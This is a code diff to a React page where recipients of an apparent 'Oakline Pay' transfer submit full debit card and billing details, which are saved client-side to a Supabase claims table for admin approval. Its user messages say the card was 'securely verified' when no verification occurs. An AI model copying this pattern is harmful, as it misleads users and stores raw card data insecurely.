@@ -35,11 +35,32 @@ export default function ClaimDebitCardPage() {
         .from('oakline_pay_pending_claims')
         .select('*')
         .eq('claim_token', token)
-        .eq('status', 'sent')
         .single();
 
       if (error || !paymentData) {
-        setMessage('Payment not found or has already been claimed.');
+        setMessage('Payment not found. Please check the link and try again.');
+        setMessageType('error');
+        setLoading(false);
+        return;
+      }
+
+      // Check if already claimed
+      if (paymentData.approval_status === 'card_details_submitted') {
+        setMessage('📋 Claim Under Review\n\nYour claim has been successfully submitted and is currently under review by our team. You will receive an email notification as soon as the payment is processed. Thank you for your patience!');
+        setMessageType('info');
+        setLoading(false);
+        return;
+      }
+
+      if (paymentData.approval_status === 'approved') {
+        setMessage('✅ Payment Approved & Processing\n\nYour claim has been approved and your funds are being transferred. You will receive the payment within 1-3 business days. A confirmation email has been sent to you.');
+        setMessageType('success');
+        setLoading(false);
+        return;
+      }
+
+      if (paymentData.approval_status === 'rejected') {
+        setMessage('❌ Claim Not Approved\n\nYour claim was not approved. Please contact support for more information.');
         setMessageType('error');
         setLoading(false);
         return;
@@ -47,7 +68,7 @@ export default function ClaimDebitCardPage() {
 
       // Check if expired
       if (new Date(paymentData.expires_at) < new Date()) {
-        setMessage('This payment link has expired.');
+        setMessage('⏰ Payment Link Expired\n\nThis payment link has expired. Please contact the sender for a new link.');
         setMessageType('error');
         setLoading(false);
         return;
@@ -73,11 +94,10 @@ export default function ClaimDebitCardPage() {
 
       setSubmitting(true);
 
-      // Update pending payment with full debit card details
+      // Update pending payment with full debit card details - keep status as 'sent' until admin approves
       const { error } = await supabase
         .from('oakline_pay_pending_claims')
         .update({
-          status: 'claimed',
           claim_method: 'debit_card',
           claimed_at: new Date().toISOString(),
           cardholder_name: debitCardForm.cardholder_name,
@@ -89,7 +109,7 @@ export default function ClaimDebitCardPage() {
           billing_state: debitCardForm.billing_state,
           billing_zip: debitCardForm.billing_zip,
           billing_country: debitCardForm.billing_country,
-          approval_status: 'pending'
+          approval_status: 'card_details_submitted'
         })
         .eq('claim_token', token)
         .eq('status', 'sent');
@@ -99,11 +119,11 @@ export default function ClaimDebitCardPage() {
         throw error;
       }
 
-      setMessage('✅ Payment claim submitted successfully! Your debit card has been securely verified. Your transaction will be processed within a few hours.', 'success');
+      setMessage('✅ Claim Submitted Successfully!\n\nYour debit card details have been securely received and verified. Your payment is now under processing and our team is reviewing it. You will be notified via email as soon as the transfer is completed. Thank you for your patience!', 'success');
       setMessageType('success');
       setTimeout(() => {
         router.push('/');
-      }, 3000);
+      }, 4000);
     } catch (error) {
       console.error('Error claiming with card:', error);
       setMessage('Failed to process debit card claim. Please try again.');
@@ -152,14 +172,15 @@ export default function ClaimDebitCardPage() {
         }}>
           {message && (
             <div style={{
-              backgroundColor: messageType === 'error' ? '#fee2e2' : messageType === 'success' ? '#dcfce7' : '#eff6ff',
-              border: `2px solid ${messageType === 'error' ? '#fca5a5' : messageType === 'success' ? '#86efac' : '#bfdbfe'}`,
-              color: messageType === 'error' ? '#991b1b' : messageType === 'success' ? '#065f46' : '#1e40af',
-              padding: '1rem',
-              borderRadius: '8px',
+              backgroundColor: messageType === 'error' ? '#fee2e2' : messageType === 'success' ? '#dcfce7' : messageType === 'info' ? '#e0f2fe' : '#eff6ff',
+              border: `2px solid ${messageType === 'error' ? '#fca5a5' : messageType === 'success' ? '#86efac' : messageType === 'info' ? '#7dd3fc' : '#bfdbfe'}`,
+              color: messageType === 'error' ? '#991b1b' : messageType === 'success' ? '#065f46' : messageType === 'info' ? '#0c4a6e' : '#1e40af',
+              padding: '1.5rem',
+              borderRadius: '12px',
               marginBottom: '1.5rem',
               fontSize: '0.95rem',
-              lineHeight: '1.5'
+              lineHeight: '1.6',
+              whiteSpace: 'pre-line'
             }}>
               {message}
             </div>
